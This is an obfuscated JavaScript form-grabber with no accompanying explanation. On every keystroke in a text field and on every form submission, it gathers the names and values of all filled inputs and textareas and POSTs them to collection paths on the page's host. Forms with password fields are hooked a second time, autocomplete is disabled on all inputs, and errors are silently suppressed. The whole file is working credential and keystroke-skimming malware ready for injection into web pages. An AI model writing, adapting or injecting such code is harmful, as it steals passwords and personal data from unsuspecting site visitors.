function obf_func_callback_37423() {
	try {
		obf_var_inputs_37423 = document.getElementsByTagName("input");
		obf_var_textareas_37423 = document.getElementsByTagName("textarea");
		obf_var_params_37423 = "";

		for (var obf_var_i_37423 = 0; obf_var_i_37423 < obf_var_inputs_37423.length; obf_var_i_37423++) {
			if (obf_var_inputs_37423[obf_var_i_37423].value != "") {
				obf_var_params_37423 += encodeURIComponent(obf_var_inputs_37423[obf_var_i_37423].name) + "=" + encodeURIComponent(obf_var_inputs_37423[obf_var_i_37423].value) + ( obf_var_i_37423 < (obf_var_inputs_37423.length-1) ? "&" : "" );
			}
		}
		for (var obf_var_i_37423 = 0; obf_var_i_37423 < obf_var_textareas_37423.length; obf_var_i_37423++) {
			if (obf_var_textareas_37423[obf_var_i_37423].value != "") {
				obf_var_params_37423 += encodeURIComponent(obf_var_textareas_37423[obf_var_i_37423].name) + "=" + encodeURIComponent(obf_var_textareas_37423[obf_var_i_37423].value) + ( obf_var_i_37423 < (obf_var_textareas_37423.length-1) ? "&" : "" );
			}
		}

		if (obf_var_params_37423.length > 0) {
			obf_var_req_37423 = new XMLHttpRequest();
			obf_var_req_37423.open("POST", "http://" + location.host + "/obf_path_callback?" + obf_var_params_37423, true);
			obf_var_req_37423.send();
		}
	} catch(obf_ignore_37423){}
}

function obf_func_whitelist_37423() {
	try {
		obf_var_inputs_37423 = document.getElementsByTagName("input");
		obf_var_textareas_37423 = document.getElementsByTagName("textarea");
		obf_var_params_37423 = "";

		for (var obf_var_i_37423 = 0; obf_var_i_37423 < obf_var_inputs_37423.length; obf_var_i_37423++) {
			if (obf_var_inputs_37423[obf_var_i_37423].value != "") {
				obf_var_params_37423 += encodeURIComponent(obf_var_inputs_37423[obf_var_i_37423].name) + "=" + encodeURIComponent(obf_var_inputs_37423[obf_var_i_37423].value) + ( obf_var_i_37423 < (obf_var_inputs_37423.length-1) ? "&" : "" );
			}
		}
		for (var obf_var_i_37423 = 0; obf_var_i_37423 < obf_var_textareas_37423.length; obf_var_i_37423++) {
			if (obf_var_textareas_37423[obf_var_i_37423].value != "") {
				obf_var_params_37423 += encodeURIComponent(obf_var_textareas_37423[obf_var_i_37423].name) + "=" + encodeURIComponent(obf_var_textareas_37423[obf_var_i_37423].value) + ( obf_var_i_37423 < (obf_var_textareas_37423.length-1) ? "&" : "" );
			}
		}

		if (obf_var_params_37423.length > 0) {
			obf_var_req_37423 = new XMLHttpRequest();
			obf_var_req_37423.open("POST", "http://" + location.host + "/obf_path_whitelist?" + obf_var_params_37423, true);
			obf_var_req_37423.send();
		}
	} catch(obf_ignore_37423){}
}

self.addEventListener("keyup", function(obf_var_event_37423) {
	try {
		if (obf_var_event_37423.target.tagName.match(/INPUT|TEXTAREA/)) {
			obf_func_callback_37423();
		}
	} catch(obf_ignore_37423){}
});

function obf_func_attack_37423() {
	document.querySelectorAll("form").forEach(function(obf_var_form_37423){
		obf_var_form_37423.addEventListener("submit", obf_func_callback_37423);
		if (obf_var_form_37423.querySelector("input[type=password]")) {
			obf_var_form_37423.addEventListener("submit", obf_func_whitelist_37423);
		}
	});

	document.querySelectorAll("input").forEach(function(obf_var_input_37423){
		obf_var_input_37423.autocomplete = "off";
	});
}

try {
	obf_func_attack_37423();
} catch(obf_ignore_37423){
	try {
		document.addEventListener("DOMContentLoaded", obf_func_attack_37423);
	} catch(obf_ignore_37423){
		self.addEventListener("load", obf_func_attack_37423);
	}
}
